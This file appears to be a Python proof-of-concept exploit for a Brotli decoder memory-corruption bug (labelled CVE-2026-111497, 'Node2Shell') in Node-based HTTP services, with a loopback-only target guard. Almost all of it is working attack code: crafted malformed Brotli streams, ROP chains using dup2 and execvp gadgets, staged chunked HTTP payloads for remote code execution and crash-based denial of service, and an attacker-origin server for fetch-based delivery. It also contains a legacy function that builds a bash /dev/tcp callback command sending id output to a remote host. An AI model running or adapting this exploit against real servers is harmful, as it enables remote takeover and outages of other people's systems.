#!/usr/bin/env python3
"""Stdlib-only proof-of-concept for the Node2Shell decoder bug.

The tool accepts only fixed loopback lab hosts and the port declared by the
selected profile. It never accepts a caller-supplied command. The RCE proof
executes ``/usr/bin/id`` and requires fresh ``uid=`` and ``gid=`` output; the
DoS proof requires four consecutive failed health checks.

Exit codes:
  0  verification passed (or a patched control failed closed as expected)
  1  verification failed, including transport and target errors
  2  usage, profile, or target-policy error
  3  target was not healthy before the attempt
  4  patched control did not fail closed with the expected decoder error
"""

from __future__ import annotations

import argparse
import hashlib
import ipaddress
import json
import pathlib
import re
import socket
import struct
import sys
import threading
import time
import urllib.parse

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
TRIGGER_SIZE = 23_068_690
DEFAULT_PORT = 3000
DEFAULT_ORIGIN_PORT = 4000
ALLOWED_TARGET_HOSTS = frozenset({"127.0.0.1", "::1", "localhost"})
ALLOWED_MODES = ("rce", "dos")
ID_OUTPUT = re.compile(
    r"uid=\d+(?:\([^)\r\n]+\))?\s+gid=\d+(?:\([^)\r\n]+\))?"
    r"(?:\s+groups=.*)?"
)
ROOT = pathlib.Path(__file__).resolve().parent
REGISTRY = ROOT / "profiles.json"
EXPECTED_PROFILE_IDS = frozenset(
    {
        "n2s-ref-express-24.22.0-x86_64",
        "n2s-wp-24.22.0-x86_64",
        "n2s-unfurl-24.22.0-x86_64",
        "n2s-ref-express-patched-24.22.1-x86_64",
        "n2s-wp-patched-24.22.1-x86_64",
        "n2s-unfurl-patched-24.22.1-x86_64",
    }
)
ALLOWED_STATUSES = frozenset(
    {"RCE verified", "DoS verified", "Patched control", "RCE not reproduced"}
)


class PocError(RuntimeError):
    """A verification or policy failure with a documented exit code."""

    def __init__(self, message: str, exit_code: int = 1) -> None:
        super().__init__(message)
        self.exit_code = exit_code


class Reporter:
    """Single output seam for human and structured results."""

    def __init__(self, json_mode: bool, quiet: bool) -> None:
        self.json_mode = json_mode
        self.quiet = quiet

    def info(self, message: str) -> None:
        if not self.json_mode and not self.quiet:
            print(message)

    def error(self, message: str) -> None:
        if not self.json_mode:
            print(message, file=sys.stderr)

    def result(self, payload: dict) -> None:
        if self.json_mode:
            print(json.dumps(payload, sort_keys=True))
        elif not self.quiet:
            for line in payload.get("_human", []):
                print(line)


class Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: Bits, value: int) -> None:
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def generate_stream() -> bytes:
    """Build the canonical malformed stream; its digest is a hard invariant."""
    bits = Bits()

    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)

    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)

    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    return bits.finish()


def check_trigger_identity() -> bytes:
    trigger = generate_stream()
    digest = hashlib.sha256(trigger).hexdigest()
    if digest != TRIGGER_SHA256:
        raise PocError(f"trigger hash mismatch: {digest}", 2)
    if len(trigger) != TRIGGER_SIZE:
        raise PocError(
            f"trigger size mismatch: {len(trigger)} != {TRIGGER_SIZE}", 2
        )
    return trigger


def generate_rce_stream(prefix: bytes, command_block_extra: int) -> bytes:
    if len(prefix) > 0x10000:
        raise ValueError("RCE prefix is too large")

    bits = Bits()
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    if prefix:
        bits.put(0, 1)
        bits.put(0, 2)
        bits.put(len(prefix) - 1, 16)
        bits.put(1, 1)
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(prefix)

    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command block extra must fit in 24 bits")
    bits.put(command_block_extra, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)
    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    distance_extra = (len(prefix) + 32) // 8
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    return bits.finish()


def trigger_stages() -> tuple[bytes, bytes]:
    first = check_trigger_identity() + b"\x00" * 3
    second = bytearray(127)
    second[7] = 8
    struct.pack_into("<i", second, 15, 0x7FFFFFFF)
    struct.pack_into("<I", second, 19, 0x7FFFFFFF)
    struct.pack_into("<I", second, 23, 0x7FFFFFFF)
    return first, bytes(second)


def profile_int(profile: dict, name: str) -> int:
    value = profile["probe"][name]
    return int(value, 0) if isinstance(value, str) else int(value)


def rce_stage_two(pos: int, size: int) -> bytes:
    if size < 27:
        raise ValueError("RCE stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


def build_rce_payload(
    profile: dict,
    callback_host: str,
    callback_port: int,
    token: str,
) -> bytes:
    """Build the legacy callback proof payload; retained for schema tests."""
    if not re.fullmatch(r"[A-Za-z0-9.-]+", callback_host):
        raise ValueError("callback host contains unsupported characters")
    allowed_hosts = profile["probe"].get("callback_hosts", [])
    if callback_host not in allowed_hosts:
        raise ValueError(f"callback host must be allowlisted: {allowed_hosts}")

    base = profile_int(profile, "bss_payload")
    gadget = profile_int(profile, "callback_gadget")
    execvp_plt = profile_int(profile, "execvp_plt")
    command = (
        f"exec 3<>/dev/tcp/{callback_host}/{callback_port};"
        f"printf '{token}\\n'>&3;id >&3"
    )

    data = bytearray(512)
    data[:8] = b"RCEPROOF"
    context_offset_value = profile["probe"].get("context_offset", 0x40)
    context_offset = (
        int(context_offset_value, 0)
        if isinstance(context_offset_value, str)
        else int(context_offset_value)
    )
    context = base + context_offset
    filename = base + 0x100
    argv = base + 0x110
    option_c = base + 0x140
    command_address = base + 0x150
    struct.pack_into("<Q", data, 0x08, gadget)
    struct.pack_into("<Q", data, 0x20, context)
    struct.pack_into("<Q", data, context_offset + 0x98, filename)
    struct.pack_into("<Q", data, context_offset + 0xA0, argv)
    struct.pack_into("<Q", data, context_offset + 0xA8, execvp_plt)
    data[0x100 : 0x10A] = b"/bin/bash\0"
    struct.pack_into("<QQQQ", data, 0x110, filename, option_c, command_address, 0)
    data[0x140 : 0x143] = b"-c\0"
    encoded_command = command.encode("ascii") + b"\0"
    if 0x150 + len(encoded_command) > len(data):
        raise ValueError("fixed id proof command does not fit the RCE payload")
    data[0x150 : 0x150 + len(encoded_command)] = encoded_command
    return bytes(data)


def rce_stage_one(
    target: int,
    command_block_extra: int,
    proof_payload: bytes | None = None,
) -> bytes:
    prefix = bytearray(1024)
    if proof_payload:
        if len(proof_payload) > 512:
            raise ValueError("RCE proof payload exceeds 512 bytes")
        prefix[: len(proof_payload)] = proof_payload

    pair = struct.pack("<QQ", target, target)
    start = 71 if not proof_payload else len(proof_payload) + (
        (7 - len(proof_payload)) % 16
    )
    for offset in range(start, len(prefix) - 15, 16):
        prefix[offset : offset + 16] = pair
    return generate_rce_stream(bytes(prefix), command_block_extra) + b"\x00" * 3


def express_socket_rce_stages(profile: dict, position: int) -> tuple[bytes, bytes]:
    """Build the exact-profile request that returns ``id`` on its socket."""
    prefix_size = profile_int(profile, "prefix_size")
    source = profile_int(profile, "copy_source_offset")
    prefix = bytearray(prefix_size)

    pivot = (
        profile_int(profile, "mov_rax_rdi_ret"),
        profile_int(profile, "pivot_rsp_rax_30_ret"),
    )
    struct.pack_into("<QQ", prefix, source, *pivot)

    bss = profile_int(profile, "bss_base")
    socket_fd = profile_int(profile, "accepted_socket_fd")
    chain = (
        profile_int(profile, "pop_rsi_ret"),
        bss + 8,
        profile_int(profile, "store_rdi_plus_88_ret"),
        profile_int(profile, "pop_rbx_ret"),
        bss,
        profile_int(profile, "pop_rdi_ret"),
        socket_fd,
        profile_int(profile, "pop_rsi_ret"),
        1,
        profile_int(profile, "dup2_plt"),
        profile_int(profile, "execvp_call_site"),
    )
    struct.pack_into("<" + "Q" * len(chain), prefix, source + 0x30, *chain)
    path = b"/usr/bin/id\0"
    path_offset = source + 0x88
    if path_offset + len(path) > len(prefix):
        raise PocError("Express id path falls outside the controlled prefix", 2)
    prefix[path_offset : path_offset + len(path)] = path

    first = (
        generate_rce_stream(
            bytes(prefix), profile_int(profile, "command_block_extra")
        )
        + b"\x00" * 3
    )
    second = rce_stage_two(position, profile_int(profile, "second_stage_size"))
    return first, second


def resolve_loopback(host: str, port: int) -> list[tuple]:
    if host != host.strip():
        raise PocError("target host contains surrounding whitespace", 2)
    normalized_host = host.lower()
    if normalized_host not in ALLOWED_TARGET_HOSTS:
        allowed = ", ".join(sorted(ALLOWED_TARGET_HOSTS))
        raise PocError(
            f"target host must be one of the fixed local-lab hosts: {allowed}", 2
        )
    if not 1 <= port <= 65535:
        raise PocError("port must be between 1 and 65535", 2)

    targets = socket.getaddrinfo(
        normalized_host, port, type=socket.SOCK_STREAM
    )
    if not targets:
        raise PocError(f"host did not resolve: {host}", 2)
    non_loopback = [
        target[4][0]
        for target in targets
        if not ipaddress.ip_address(target[4][0]).is_loopback
    ]
    if non_loopback:
        raise PocError(
            f"refusing non-loopback target {host}: {', '.join(non_loopback)}", 2
        )
    return targets


def connect_target(targets: list[tuple], timeout: float) -> socket.socket:
    last_error: OSError | None = None
    for family, socktype, protocol, _, address in targets:
        connection = socket.socket(family, socktype, protocol)
        connection.settimeout(min(timeout, 2.0))
        try:
            connection.connect(address)
            connection.settimeout(timeout)
            return connection
        except OSError as error:
            last_error = error
            connection.close()
    if last_error is None:
        raise PocError("no resolved loopback target", 1)
    raise last_error


def receive_line(connection: socket.socket, limit: int = 256) -> bytes:
    data = bytearray()
    while len(data) < limit:
        chunk = connection.recv(1)
        if not chunk:
            break
        data.extend(chunk)
        if chunk == b"\n":
            break
    return bytes(data)


def receive_http(connection: socket.socket, limit: int = 16384) -> bytes:
    data = bytearray()
    try:
        while len(data) < limit:
            chunk = connection.recv(min(4096, limit - len(data)))
            if not chunk:
                break
            data.extend(chunk)
    except OSError:
        pass
    return bytes(data)


def http_healthcheck(targets: list[tuple], timeout: float) -> bool:
    try:
        with connect_target(targets, timeout) as connection:
            connection.sendall(
                b"GET /health HTTP/1.1\r\n"
                b"Host: lab\r\n"
                b"Connection: close\r\n\r\n"
            )
            response = receive_http(connection)
            return response.startswith(b"HTTP/1.1 200") and b"PONG\n" in response
    except OSError:
        return False


def wait_http_healthcheck(
    targets: list[tuple], timeout: float, deadline_seconds: float
) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if http_healthcheck(targets, min(timeout, 1.0)):
            return True
        time.sleep(0.1)
    return False


def wait_http_unhealthy(
    targets: list[tuple], timeout: float, deadline_seconds: float
) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if not http_healthcheck(targets, min(timeout, 0.5)):
            return True
        time.sleep(0.05)
    return False


def chunk(data: bytes) -> bytes:
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


def http_br_body_attack(
    targets: list[tuple],
    timeout: float,
    path: str,
    content_type: str,
) -> bytes:
    first, second = trigger_stages()
    headers = (
        f"POST {path} HTTP/1.1\r\n".encode("ascii")
        + b"Host: lab\r\n"
        + f"Content-Type: {content_type}\r\n".encode("ascii")
        + b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    with connect_target(targets, timeout) as connection:
        connection.sendall(headers)
        connection.sendall(chunk(first))
        time.sleep(0.5)
        try:
            connection.sendall(chunk(second) + b"0\r\n\r\n")
        except OSError:
            return b""
        return receive_http(connection)


def serve_brotli_origin(
    listener: socket.socket,
    first: bytes,
    second: bytes,
    timeout: float,
    state: dict[str, object],
) -> None:
    try:
        listener.settimeout(timeout)
        connection, _ = listener.accept()
        state["connected"] = True
        with connection:
            connection.settimeout(timeout)
            request = bytearray()
            while b"\r\n\r\n" not in request and len(request) < 8192:
                data = connection.recv(1024)
                if not data:
                    break
                request.extend(data)
            if not request.startswith(b"GET "):
                raise RuntimeError("origin received a non-GET request")
            connection.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                b"Transfer-Encoding: chunked\r\n"
                b"Connection: close\r\n\r\n"
            )
            connection.sendall(chunk(first))
            state["first_sent"] = True
            time.sleep(0.5)
            state["second_attempted"] = True
            connection.sendall(chunk(second) + b"0\r\n\r\n")
    except OSError as error:
        state["error"] = error


def encode_fetch_request(
    method: str, path: str, payload: bytes | None
) -> bytes:
    headers = (
        f"{method} {path} HTTP/1.1\r\n".encode("ascii")
        + b"Host: lab\r\n"
        b"Connection: close\r\n"
    )
    if payload is not None:
        headers += (
            b"Content-Type: application/json\r\n"
            + f"Content-Length: {len(payload)}\r\n".encode("ascii")
        )
    return headers + b"\r\n" + (payload or b"")


def http_fetch_attack(
    profile: dict,
    spec: dict,
    targets: list[tuple],
    timeout: float,
) -> bytes:
    first, second = trigger_stages()
    origin_host = spec["origin_host"]
    origin_port = int(spec.get("origin_port", DEFAULT_ORIGIN_PORT))
    origin_bind = spec.get("origin_bind", "127.0.0.1")
    if origin_bind not in {"127.0.0.1", "0.0.0.0"}:
        raise PocError("origin bind must be 127.0.0.1 or 0.0.0.0", 2)
    origin_url = f"http://{origin_host}:{origin_port}/payload"
    method = spec.get("method", "POST").upper()
    path = spec["path"]
    if method == "GET":
        path = path + "?url=" + urllib.parse.quote(origin_url, safe="")
        payload = None
    else:
        payload = json.dumps({"url": origin_url}, separators=(",", ":")).encode()
    state: dict[str, object] = {}

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((origin_bind, origin_port))
        listener.listen(1)
        thread = threading.Thread(
            target=serve_brotli_origin,
            args=(listener, first, second, timeout, state),
            daemon=True,
        )
        thread.start()
        with connect_target(targets, timeout) as connection:
            connection.sendall(encode_fetch_request(method, path, payload))
            response = receive_http(connection)
        thread.join(timeout)

    if thread.is_alive():
        raise PocError("attacker origin did not finish", 1)
    if not state.get("connected"):
        raise PocError(f"target did not fetch from attacker origin: {state}", 1)
    if not state.get("first_sent") or not state.get("second_attempted"):
        raise PocError(f"attacker origin did not send both stages: {state}", 1)
    return response


def send_express_exploit(
    profile: dict,
    spec: dict,
    targets: list[tuple],
    position: int,
    timeout: float,
    stage_delay: float,
) -> bytes:
    first, second = express_socket_rce_stages(profile, position)
    headers = (
        f"POST {spec['path']} HTTP/1.1\r\n".encode("ascii")
        + b"Host: lab\r\n"
        + f"Content-Type: {spec.get('content_type', 'application/json')}\r\n".encode(
            "ascii"
        )
        + b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    try:
        with connect_target(targets, timeout) as connection:
            connection.sendall(headers + chunk(first))
            time.sleep(stage_delay)
            connection.sendall(chunk(second) + b"0\r\n\r\n")
            return receive_http(connection)
    except OSError:
        return b""


def http_express_socket_rce_attack(
    profile: dict,
    spec: dict,
    targets: list[tuple],
    timeout: float,
    attempts_override: int | None,
    reporter: Reporter,
) -> tuple[int, str]:
    probe = profile["probe"]
    raw_positions = probe["staged_positions"]
    if isinstance(raw_positions, int):
        positions = [raw_positions]
    else:
        positions = [
            int(value, 0) if isinstance(value, str) else int(value)
            for value in raw_positions
        ]
    if not positions:
        raise PocError("Express RCE profile has no staged positions", 2)
    attempts = attempts_override or int(probe["attempts"])
    stage_delay = float(probe["stage_delay_seconds"])
    restart_timeout = float(probe["restart_timeout_seconds"])
    content_type = spec.get("content_type", "application/json")
    crash_path = spec.get("crash_path", spec["path"])

    last_response = b""
    for attempt in range(1, attempts + 1):
        if not wait_http_healthcheck(targets, timeout, restart_timeout):
            raise PocError(
                "Express lab did not become healthy for a fresh attempt", 3
            )
        position = positions[(attempt - 1) % len(positions)]
        reporter.info(
            f"attempt={attempt}/{attempts} staged_position={position:#x}"
        )
        last_response = send_express_exploit(
            profile, spec, targets, position, timeout, stage_delay
        )

        text = last_response.decode("utf-8", errors="replace").strip()
        identity = next(
            (
                line.strip()
                for line in text.splitlines()
                if ID_OUTPUT.fullmatch(line.strip()) is not None
            ),
            None,
        )
        if identity is not None:
            return attempt, identity

        if attempt < attempts:
            reporter.info("fresh_process_reset=network crash trigger")
            try:
                http_br_body_attack(targets, timeout, crash_path, content_type)
            except OSError:
                pass
            if not wait_http_unhealthy(targets, timeout, 3.0):
                raise PocError(
                    "network crash trigger did not stop the current Express worker",
                    1,
                )

    sample = last_response[:512].decode("latin-1", errors="replace")
    raise PocError(
        f"fresh id output was not observed after {attempts} attempts; "
        f"last_response={sample!r}",
        1,
    )


def load_profiles() -> dict[str, dict]:
    try:
        registry = json.loads(REGISTRY.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        raise PocError(f"cannot load {REGISTRY.name}: {error}", 2) from error
    profiles = {profile["id"]: profile for profile in registry.get("profiles", [])}
    if len(profiles) != len(registry.get("profiles", [])):
        raise PocError("profiles.json contains duplicate profile IDs", 2)
    unsupported = {
        profile_id: profile.get("status")
        for profile_id, profile in profiles.items()
        if profile.get("status") not in ALLOWED_STATUSES
    }
    if unsupported:
        raise PocError(f"unsupported profile statuses: {unsupported}", 2)
    return profiles


def mode_spec(profile: dict, mode: str | None) -> tuple[str, dict]:
    probe = profile["probe"]
    selected = mode or profile.get("default_mode", "dos")
    if selected not in ALLOWED_MODES:
        raise PocError(f"unsupported mode: {selected}", 2)
    modes = probe.get("modes", {})
    if selected not in modes:
        raise PocError(
            f"profile has no {selected!r} mode; available: {sorted(modes)}", 2
        )
    spec = dict(probe)
    spec.update(modes[selected])
    spec["_mode"] = selected
    return selected, spec


def healthcheck(targets: list[tuple], timeout: float) -> bool:
    return http_healthcheck(targets, timeout)


def verify_patched_control(
    profile_id: str,
    profile: dict,
    mode: str,
    spec: dict,
    targets: list[tuple],
    timeout: float,
    reporter: Reporter,
) -> int:
    if not healthcheck(targets, timeout):
        raise PocError("patched target was not healthy before the attempt", 3)
    transport = spec["transport"]
    if transport == "http-express-socket-rce":
        raw_positions = profile["probe"]["staged_positions"]
        raw_position = (
            raw_positions[0] if isinstance(raw_positions, list) else raw_positions
        )
        position = (
            int(raw_position, 0)
            if isinstance(raw_position, str)
            else int(raw_position)
        )
        response = send_express_exploit(
            profile,
            spec,
            targets,
            position,
            timeout,
            float(profile["probe"]["stage_delay_seconds"]),
        )
    elif transport == "http-br-body":
        response = http_br_body_attack(
            targets,
            timeout,
            spec["path"],
            spec.get("content_type", "application/json"),
        )
    elif transport == "http-fetch":
        response = http_fetch_attack(profile, spec, targets, timeout)
    else:
        raise PocError(f"unsupported transport: {transport}", 2)

    text = response.decode("utf-8", errors="replace")
    expected = "ERR__ERROR_FORMAT_BLOCK_SWITCH"
    if expected not in text:
        raise PocError(
            f"patched control did not report {expected}: {text[:400]!r}", 4
        )
    if not healthcheck(targets, min(timeout, 2.0)):
        raise PocError("patched service did not remain healthy", 4)

    payload = {
        "status": "pass",
        "claim": "patched control",
        "profile": profile_id,
        "mode": mode,
        "error_seen": expected,
        "post_attempt_health": "PONG",
        "_human": [
            "PASS: patched control failed closed",
            f"profile={profile_id}",
            f"mode={mode}",
            f"error_seen={expected}",
            "post_attempt_health=PONG",
        ],
    }
    reporter.result(payload)
    return 0


def verify_affected(
    profile_id: str,
    profile: dict,
    mode: str,
    spec: dict,
    targets: list[tuple],
    timeout: float,
    attempts: int | None,
    reporter: Reporter,
) -> int:
    if not healthcheck(targets, timeout):
        raise PocError("target service was not healthy before the attempt", 3)
    transport = spec["transport"]
    if transport == "http-express-socket-rce":
        attempt, identity = http_express_socket_rce_attack(
            profile, spec, targets, timeout, attempts, reporter
        )
        payload = {
            "status": "pass",
            "claim": "RCE",
            "profile": profile_id,
            "mode": mode,
            "proof_channel": "HTTP request socket stdout",
            "proof_command": "id",
            "proof_stdout": identity,
            "successful_attempt": attempt,
            "_human": [
                "PASS: RCE verified by fresh id output through the declared interface",
                f"profile={profile_id}",
                "proof_channel=HTTP request socket stdout",
                "proof_command=id",
                f"proof_stdout={identity}",
                f"successful_attempt={attempt}",
            ],
        }
        reporter.result(payload)
        return 0

    if transport == "http-br-body":
        response = http_br_body_attack(
            targets,
            timeout,
            spec["path"],
            spec.get("content_type", "application/json"),
        )
    elif transport == "http-fetch":
        response = http_fetch_attack(profile, spec, targets, timeout)
    else:
        raise PocError(f"unsupported transport: {transport}", 2)

    for check in range(1, 5):
        if healthcheck(targets, min(timeout, 1.0)):
            raise PocError(
                f"target remained healthy after trigger on health check {check}/4; "
                f"response={response[:200]!r}",
                1,
            )
        time.sleep(0.25)

    payload = {
        "status": "pass",
        "claim": "DoS",
        "profile": profile_id,
        "mode": mode,
        "trigger_sha256": TRIGGER_SHA256,
        "postcondition": "service unavailable",
        "healthchecks_failed": "4/4",
        "_human": [
            "PASS: DoS verified through the declared network interface",
            f"profile={profile_id}",
            f"trigger_sha256={TRIGGER_SHA256}",
            "postcondition=service unavailable",
            "healthchecks_failed=4/4",
        ],
    }
    reporter.result(payload)
    return 0


def dry_run(profile_id: str, profile: dict, mode: str, spec: dict) -> dict:
    transport = spec["transport"]
    if transport == "http-express-socket-rce":
        positions = profile["probe"]["staged_positions"]
        raw_position = positions[0] if isinstance(positions, list) else positions
        position = (
            int(raw_position, 0)
            if isinstance(raw_position, str)
            else int(raw_position)
        )
        first, second = express_socket_rce_stages(profile, position)
        return {
            "dry_run": True,
            "profile": profile_id,
            "mode": mode,
            "payload": "express-socket-rce",
            "path": spec["path"],
            "staged_position": hex(position),
            "stage_one_bytes": len(first),
            "stage_one_sha256": hashlib.sha256(first).hexdigest(),
            "stage_two_bytes": len(second),
            "stage_two_sha256": hashlib.sha256(second).hexdigest(),
        }

    if transport in {"http-br-body", "http-fetch"}:
        first, second = trigger_stages()
        return {
            "dry_run": True,
            "profile": profile_id,
            "mode": mode,
            "payload": transport,
            "path": spec["path"],
            "trigger_sha256": TRIGGER_SHA256,
            "stage_one_bytes": len(first),
            "stage_one_sha256": hashlib.sha256(first).hexdigest(),
            "stage_two_bytes": len(second),
            "stage_two_sha256": hashlib.sha256(second).hexdigest(),
        }
    raise PocError(f"unsupported transport: {transport}", 2)


def self_test(json_mode: bool = False) -> int:
    trigger = check_trigger_identity()
    profiles = load_profiles()
    missing = EXPECTED_PROFILE_IDS - set(profiles)
    if missing:
        raise PocError(f"missing required profiles: {sorted(missing)}", 2)
    for profile_id, profile in profiles.items():
        probe = profile.get("probe", {})
        if probe.get("trigger_sha256") != TRIGGER_SHA256:
            raise PocError(f"{profile_id}: trigger digest is not the anchor", 2)
        for mode in ALLOWED_MODES:
            if mode in probe.get("modes", {}):
                _name, spec = mode_spec(profile, mode)
                if spec["transport"] not in {
                    "http-express-socket-rce",
                    "http-br-body",
                    "http-fetch",
                }:
                    raise PocError(
                        f"{profile_id}: unsupported {mode} transport", 2
                    )
    fixture = {
        "probe": {
            "callback_hosts": ["127.0.0.1"],
            "bss_payload": "0x1000",
            "callback_gadget": "0x2000",
            "execvp_plt": "0x3000",
            "context_offset": 0x40,
        }
    }
    callback_proof = build_rce_payload(
        fixture, "127.0.0.1", 4444, "SELFTEST"
    )
    if not callback_proof.startswith(b"RCEPROOF"):
        raise PocError("self-test callback payload is malformed", 2)
    if not rce_stage_one(0x1000, 0xFFFFFF):
        raise PocError("self-test staged payload is empty", 2)
    first, second = trigger_stages()
    digest = hashlib.sha256(trigger).hexdigest()
    payload = {
        "status": "pass",
        "claim": "self-test",
        "trigger_sha256": digest,
        "trigger_bytes": len(trigger),
        "stage_one_bytes": len(first),
        "stage_two_bytes": len(second),
        "profiles": len(profiles),
        "network": "not_used",
    }
    if json_mode:
        print(json.dumps(payload, sort_keys=True))
    else:
        print("SELF-TEST PASS")
        print(f"trigger_sha256={digest}")
        print(f"trigger_bytes={len(trigger)}")
        print(f"stage_one_bytes={len(first)}")
        print(f"stage_two_bytes={len(second)}")
        print(f"profiles={len(profiles)}")
        print("network=not_used")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Send the CVE-2026-111497 trigger to an already-running loopback lab."
        ),
        epilog=(
            "Exit codes: 0 PASS, 1 verification failure, 2 usage or policy "
            "error, 3 unhealthy precondition, 4 patched control mismatch. "
            "Only 127.0.0.1, ::1, and localhost are accepted. The only command "
            "executed by the RCE proof is /usr/bin/id."
        ),
    )
    parser.add_argument("--profile", help="exact profile ID from profiles.json")
    parser.add_argument(
        "--mode",
        choices=ALLOWED_MODES,
        help="rce or dos; defaults to the profile's documented primary mode",
    )
    parser.add_argument(
        "--list-profiles", action="store_true", help="list exact profiles and exit"
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="verify the trigger digest and profile schema without network access",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="build the selected payload, print its SHA-256, and send nothing",
    )
    parser.add_argument(
        "--json", action="store_true", help="emit one structured JSON result"
    )
    parser.add_argument(
        "--quiet", action="store_true", help="suppress human-readable stdout"
    )
    parser.add_argument("--host", default="127.0.0.1", help="fixed loopback host")
    parser.add_argument(
        "--port",
        type=int,
        help="target port; must equal the port declared by the profile",
    )
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="per-operation timeout (1-120 s)"
    )
    parser.add_argument(
        "--attempts",
        type=int,
        help="override the exact-profile RCE attempt count (1-50)",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    reporter = Reporter(args.json, args.quiet)

    if args.self_test:
        if args.profile or args.list_profiles:
            parser.error("--self-test cannot be combined with a profile selection")
        return self_test(args.json)

    profiles = load_profiles()
    if args.list_profiles:
        rows = [
            {
                "id": profile["id"],
                "status": profile["status"],
                "default_mode": profile.get("default_mode"),
                "transport": profile["probe"].get("transport"),
            }
            for profile in profiles.values()
        ]
        if args.json:
            print(json.dumps({"profiles": rows}, sort_keys=True))
        elif not args.quiet:
            width = max(len(row["id"]) for row in rows)
            for row in rows:
                print(
                    f"{row['id']:<{width}}  {row['status']:<18}  "
                    f"{row['default_mode']:<3}  {row['transport']}"
                )
        return 0

    if not args.profile:
        parser.error(
            "--profile is required unless --list-profiles or --self-test is used"
        )
    if args.profile not in profiles:
        raise PocError(
            f"unknown profile {args.profile!r}; use --list-profiles", 2
        )
    if args.timeout <= 0 or args.timeout > 120:
        raise PocError("timeout must be greater than 0 and at most 120 seconds", 2)
    if args.attempts is not None and not 1 <= args.attempts <= 50:
        raise PocError("attempts must be between 1 and 50", 2)

    profile = profiles[args.profile]
    mode, spec = mode_spec(profile, args.mode)
    if args.dry_run:
        payload = dry_run(args.profile, profile, mode, spec)
        if args.json:
            print(json.dumps(payload, sort_keys=True))
        elif not args.quiet:
            for key, value in payload.items():
                print(f"{key}={value}")
        return 0

    declared_port = int(profile["probe"].get("port", DEFAULT_PORT))
    selected_port = args.port if args.port is not None else declared_port
    if selected_port != declared_port:
        raise PocError(
            f"target port must match the selected profile: {declared_port}", 2
        )
    targets = resolve_loopback(args.host, selected_port)
    if profile.get("expect") == "fail_closed":
        return verify_patched_control(
            args.profile, profile, mode, spec, targets, args.timeout, reporter
        )
    return verify_affected(
        args.profile,
        profile,
        mode,
        spec,
        targets,
        args.timeout,
        args.attempts,
        reporter,
    )


